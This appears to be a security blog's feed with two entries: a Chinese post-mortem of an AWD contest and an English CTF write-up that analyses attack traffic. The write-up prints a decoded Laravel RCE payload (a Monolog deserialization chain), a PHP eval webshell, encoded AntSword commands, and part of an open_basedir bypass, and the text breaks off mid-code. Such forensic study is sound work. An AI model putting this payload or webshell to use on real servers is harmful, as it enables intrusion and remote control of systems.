    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次打绿城杯代价挺大的，改签机票提前住了一晚宾馆，在高铁站打了一天初赛；进了线下学校不报销路费，来回平均一个人1500块，一共去了四个人。最后的结果是上午CTF一分没拿，下午AWD打到了第九名，总体排名还是没有排到前9，只给了优胜奖。撇去自身实力原因外，我想吐槽组委会：为什么本来说只有AWD结果上午打CTF?说是CTF/AWD分值一比一，是否严格履行？你线下AWD搞个CTF是什么意思？防止PY上午不禁止去厕所，下午AWD却禁止去厕所，谁AWD还有空去PY？消息通知混乱，到了郑州才知道要做核酸，获奖队伍少，奖金少，无现金，只有E卡。我愿称之为全国最穷国家网络安全宣传周活动。<br>下面说我在比赛中返的一些错误。上午CTF，本人菜，没啥好说的。</p><h1 id="致命"><a href="#致命" class="headerlink" title="致命"></a>致命</h1><p>AWD流程环节出现严重问题。赛前演练四个人的配合中都没有演练到文件监控脚本的使用，导致被别人种了不死马掉大分。在监控不到流量、pwn题下线、web一直被打的情况下当时没有想到不死马这个事情，是我疏忽了。上了文件监控脚本后再也没失分。（自动删除不死马及任何新上传的文件，无crontab，这里需要注意的是，<strong>比赛的时候我忘记crontab路径了，只能看当前user，但shell的权限大部分是www-data需要加强记忆</strong>）</p><h1 id="严重"><a href="#严重" class="headerlink" title="严重"></a>严重</h1><p>脚本编写能力过差。当队友通过流量抓取到漏洞利用方式时，经我验证后应该迅速写出批量利用脚本，在这个地方卡住了，导致写脚本写的比较慢，应该是丢掉了许多分数。</p><p>无法自动提交flag。安恒的HTTPS流量不知道为啥抓不到，没有办法用脚本自动提交flag。</p><p>无法进一步利用已知漏洞种植不死马。这导致丢了很多分数</p><p>赛时脚本结构混乱，应将功能点分开，RCE利用和种马应同时尝试进行，利用马getflag的操作应该在另一个文件中。多线程尚未熟练掌握</p><p>AOIAWD赛前未成功部署，仅靠watchbird总是感觉力不从心。</p><h1 id="轻微"><a href="#轻微" class="headerlink" title="轻微"></a>轻微</h1><p>赛时紧张，对待队友的态度有时过激。</p><h1 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h1><p>1.提高脚本编写能力，掌握多线程，优化脚本结构</p><p>2.在AWD演练中尝试使用RCE漏洞种植不死马并getflag。</p><p>3.本地部署AOIAWD</p><p>4.crontab路径熟记，防止有人写crontab。</p><p>5.模拟时严格演练流程，优化分工。</p><p>6.应正确对待队友，克制自己的情绪。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次我有点拉跨，不过队友的表现很好，能各司其职的负责我所分配的认为（流量、赛题监控、备份与恢复、杀毒、流量告警等）我认为我的队友第一次打线下AWD能做到这种程度比我强太多了。下次AWD一定拿下！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这次打绿城杯代价挺大的，改签机票提前住了一晚宾馆，在高铁站打了一天初赛；进了线下学校不报销路费，来回平均一个人1500块，一共去了四个人。最</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Traffic analysis in Lvcheng Cup</title>
    <link href="https://polosec.github.io/2021/10/09/Traffic-analysis-in-Lvcheng-Cup/"/>
    <id>https://polosec.github.io/2021/10/09/Traffic-analysis-in-Lvcheng-Cup/</id>
    <published>2021-10-09T02:59:51.000Z</published>
    <updated>2021-10-09T07:43:36.960Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Target: <strong>FIND THE FLAG(hint : AntSwort traffic)</strong></p><p>Personally I think this problem is challenging for me,it contains Cobalt Strike traffic analysis, laravel Rce traffic analysis and AntSwort traffic analysis.</p><h1 id="AntSword-and-Laravel-RCE-Traffic-Analysis"><a href="#AntSword-and-Laravel-RCE-Traffic-Analysis" class="headerlink" title="AntSword  and Laravel RCE Traffic  Analysis"></a>AntSword  and Laravel RCE Traffic  Analysis</h1><p>There are many packets in the pcap file,personally I’’ll use http.request.method==POST to filter http traffic beacuse most of webshell are use post method sends data to victims.Obviously there are too many packets contains ignition field, after googling, I found that this is Laravel RCE explotiation. </p><p><img src="http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim" alt="paste image"><br>Following figure shows that .config.php were frequently requested ,follow it in HTTP stream, obviously the webshell executed ls command.</p><p><img src="http://cdn.polowong.top/16335741885165rs7bwkh.png?imageslim" alt="paste image"><br><img src="http://cdn.polowong.top/1633574233022a3e3z8xv.png?imageslim" alt="paste image"></p><h2 id="node1"><a href="#node1" class="headerlink" title="node1"></a>node1</h2><p>Keep following requests which connnected to config.php,we can find a pacaket made an extract operation and the file name is secret.zip,this file is suspicious and it should be recovered .After extarcing HTTP objects I haven’t find secret.zip,so keep following  packets.<br><img src="http://cdn.polowong.top/1633574349937r8r9xs6k.png?imageslim" alt="paste image"><br><img src="http://cdn.polowong.top/163357529132181rdbcyd.png?imageslim" alt="paste image"></p><h2 id="node1-end"><a href="#node1-end" class="headerlink" title="node1 end"></a>node1 end</h2><p>In a packet we find PK filed in response data,so it should be recovered with zip file format.There is one thing to note,in the start and end postions of response data exists hex data,AntSword added it to reduce traffic character.</p><p><img src="http://cdn.polowong.top/16335744113565ygjm6if.png?imageslim" alt="paste image"></p><p>Use 010 editor to recover this file ,then open it, but it tips me password are required,now I didn’t find any passwords,after fix ,check and broute tools I still can’t open it.So I have to find the password.We can find that the secret file is .cobaltstrike.beacon_keys file ,it’s serialized file contains public and private key.If we can crack the password and recover private key, the ciphertext between hacker and coblatstrike teamserver will be cracked.</p><p>In <strong>node 1</strong> we find an extract command were executed, so next setp is recover webshell contents and know the exact command, it must contains exact password.The webshell were written by Laravel RCE, so we should find what hacker did via Laravel RCE exploitation.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00</span><br></pre></td></tr></table></figure><p>Replacing =00 to null then base64 decode it, we can get the webshell contents.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php __HALT_COMPILER(); ?&gt;</span><br><span class="line">�a:2:&#123;i:7;O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\Handler\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;dummy\KKa~ضtest.txt\KKa~ضtesttest6z&#x3D;Jc�F��ؐ݌&amp;~�&lt;@��GBMB</span><br></pre></td></tr></table></figure><?php @eval(@gzinflate(base64_decode($_POST[14433])));?><p> are webshell.We can decode traffic after base64 and gzip decode.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;</span><br><span class="line">_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4F</span><br><span class="line">b430b310838a93&#x3D;4g</span><br><span class="line">f861d394170244&#x3D;X4Y21k</span><br><span class="line">ufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm</span><br></pre></td></tr></table></figure><p>Above encryped data are webshell commands which executing extract zip file,decode it with base64 and gzip, we can get the source code of server send to client.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);</span><br><span class="line">if($opdir) &#123;</span><br><span class="line">$ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir);</span><br><span class="line">@array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class="line">foreach($oparr as $item) &#123;</span><br><span class="line">if(!@is_writable($item)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;;</span><br><span class="line">@mkdir($tmdir);</span><br><span class="line">if(!@file_exists($tmdir)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">@chdir($tmdir);</span><br><span class="line">@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class="line">$cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\|\&#x2F;&#x2F;&quot;,$tmdir);</span><br><span class="line">for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123;</span><br><span class="line">@chdir(&quot;..&quot;);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">@ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;);</span><br><span class="line">@rmdir($tmdir);</span><br><span 